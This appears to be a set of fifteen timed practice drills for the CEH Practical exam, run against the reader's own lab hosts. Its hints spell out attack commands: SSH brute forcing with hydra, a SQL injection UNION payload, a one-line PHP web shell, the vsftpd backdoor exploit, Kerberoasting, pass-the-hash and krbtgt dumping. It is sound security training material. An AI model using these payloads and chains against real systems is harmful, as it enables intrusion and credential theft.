# CEH Practical — Timed Drills

> Practice challenges that **mimic Practical questions**, run against your own [lab](../labs/). Each has a **time target** — set a timer and treat it like the real exam. Answer from the tool output; expand the hint only if stuck. When you can clear these cold, the Practical's pacing won't surprise you.

> **Setup:** lab running ([`../labs/README.md`](../labs/README.md)); Kali `192.168.56.10`, Metasploitable2 `192.168.56.20`, DC/ADCS `192.168.56.30` (`ceh.lab`), Docker web `localhost:8081–8084`. Recipes: [challenge-playbooks.md](challenge-playbooks.md).

> This is the **quick sampler**. For depth, use the per-domain packs in [`drills/`](drills/) (8–12 challenges each, full walkthroughs), generate stego/pcap/crypto/hash challenges with [`challenge-lab/`](challenge-lab/), and sit a full [simulated exam](exams/) when ready.

Score yourself: **✅ under target time / ⚠️ over time / ❌ needed the hint**. Re-drill anything not ✅.

---

### Drill 1 — Fingerprint a host ⏱️ 6 min
**Q:** What is the exact version of the FTP service running on `192.168.56.20`, and what OS does the host report?
<details><summary>Hint</summary>`sudo nmap -sV -O -p21 192.168.56.20`. Answer = the `VERSION` column (e.g., `vsftpd 2.3.4`) and the OS guess.</details>

### Drill 2 — Enumerate SMB and read a file ⏱️ 8 min
**Q:** List the SMB shares on `192.168.56.20` and read a file from a world-readable share.
<details><summary>Hint</summary>`smbclient -L //192.168.56.20 -N`, then `smbclient //192.168.56.20/<share> -N` → `get <file>`. Also try `nxc smb 192.168.56.20 --shares`.</details>

### Drill 3 — Crack a shadow hash ⏱️ 10 min
**Q:** You captured this line from `/etc/shadow`. What is the user's password? (Generate one first: on Metasploitable, `sudo grep msfadmin /etc/shadow`.)
<details><summary>Hint</summary>Identify the `$id$` (`$1$`=md5crypt → hashcat `-m 500`; `$6$`=sha512crypt → `-m 1800`). `hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt` or `john --wordlist=... hash.txt`. Answer = plaintext.</details>

### Drill 4 — Online brute force ⏱️ 8 min
**Q:** What is the SSH password of `msfadmin` on `192.168.56.20`?
<details><summary>Hint</summary>`hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.20 -t 4 -f`. (It's an easy one — the point is doing it fast.)</details>

### Drill 5 — SQL injection to a value ⏱️ 12 min
**Q:** On DVWA (`localhost:8081`, security=low), extract the password **hash** for the `admin` user, then crack it. What is admin's password?
<details><summary>Hint</summary>Manual: `1' UNION SELECT user,password FROM users -- -`. Or `sqlmap -u "...sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=..; security=low" --batch -D dvwa -T users -C user,password --dump`. The hash is MD5 → `hashcat -m 0`. Answer = plaintext (e.g., `password`).</details>

### Drill 6 — Web shell → command execution ⏱️ 12 min
**Q:** Using DVWA's file-upload page (low), upload a web shell and run a command. What is the output of `id`?
<details><summary>Hint</summary>Upload `<?php system($_GET['c']); ?>` as `shell.php`, then `curl "http://localhost:8081/hackable/uploads/shell.php?c=id"`. Answer = the `uid=..` line.</details>

### Drill 7 — Get a shell with Metasploit ⏱️ 10 min
**Q:** Exploit the vsftpd backdoor on `192.168.56.20` and read `/etc/passwd`'s root line — what shell is set for root?
<details><summary>Hint</summary>`msfconsole` → `use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.20; run` → in the shell `head -1 /etc/passwd`. Answer = `/bin/bash`.</details>

### Drill 8 — Linux privesc ⏱️ 12 min
**Q:** From a low-priv shell on a lab Linux box, find one SUID binary that could be abused for privesc. Name it.
<details><summary>Hint</summary>`find / -perm -4000 -type f 2>/dev/null` then check each against https://gtfobins.github.io/. Answer = the binary path.</details>

### Drill 9 — Kerberoast and crack ⏱️ 12 min
**Q:** Recover the plaintext password of the `svc-sql` service account in `ceh.lab`.
<details><summary>Hint</summary>`impacket-GetUserSPNs ceh.lab/jdoe:'Passw0rd!' -dc-ip 192.168.56.30 -request -outputfile k.txt` → `hashcat -m 13100 k.txt rockyou.txt`. Answer = the cracked service password.</details>

### Drill 10 — Pass-the-Hash ⏱️ 8 min
**Q:** Given a captured NT hash for a local admin, get a shell on `192.168.56.31` without the plaintext. What is the hostname?
<details><summary>Hint</summary>`nxc smb 192.168.56.31 -u Administrator -H <NThash>` or `impacket-psexec Administrator@192.168.56.31 -hashes :<NThash>` → `hostname`.</details>

### Drill 11 — Creds from a packet capture ⏱️ 10 min
**Q:** Capture your own FTP login to `192.168.56.20`, then recover the username and password from the pcap.
<details><summary>Hint</summary>`sudo tcpdump -i eth1 -w cap.pcap` while you `ftp 192.168.56.20`; then Wireshark → Follow TCP Stream, or `tshark -r cap.pcap -Y 'ftp.request.command=="USER" or ftp.request.command=="PASS"' -T fields -e ftp.request.arg`.</details>

### Drill 12 — Steganography extract ⏱️ 8 min
**Q:** Hide a secret in an image with `steghide`, then recover it as if it were a challenge file.
<details><summary>Hint</summary>Embed: `steghide embed -cf pic.jpg -ef secret.txt` (set a passphrase). Recover: `steghide extract -sf pic.jpg`. Also practice `strings`, `exiftool`, `binwalk -e`, `zsteg` on a PNG.</details>

### Drill 13 — Crack a WPA handshake ⏱️ 10 min
**Q:** Using the aircrack-ng sample capture (or a handshake from **your own** AP), recover the Wi-Fi passphrase.
<details><summary>Hint</summary>`aircrack-ng -w /usr/share/wordlists/rockyou.txt <capture>.cap`, or `hcxpcapngtool -o h.hc22000 cap.pcapng && hashcat -m 22000 h.hc22000 rockyou.txt`. (Aircrack ships a `wpa.cap` test file.)</details>

### Drill 14 — Decode a mystery string ⏱️ 5 min
**Q:** Decode `Q0VILVBSQUNUSUNBTA==` and then identify what type of value the result is.
<details><summary>Hint</summary>`echo 'Q0VILVBSQUNUSUNBTA==' | base64 -d`. Chain unknown encodings in CyberChef ("Magic").</details>

### Drill 15 — Full chain (capstone-style) ⏱️ 45 min
**Q:** Starting as `jdoe`, reach Domain Admin on `ceh.lab` and recover the `krbtgt` hash.
<details><summary>Hint</summary>Follow [`../labs/capstone.md`](../labs/capstone.md): enumerate (BloodHound) → Kerberoast/RBCD/ADCS ESC1 to escalate → `impacket-secretsdump ceh.lab/administrator@192.168.56.30 -just-dc-user krbtgt`. This is the multi-step scenario the Practical builds toward.</details>

---

## After each session
- Log which drills were ✅/⚠️/❌ in [`../PROGRESS.md`](../PROGRESS.md).
- Re-run every ⚠️/❌ until it's ✅ under time.
- When drills 1–14 are ✅ cold and you can finish drill 15, you have the *speed*, not just the *knowledge* — that's what the Practical measures.
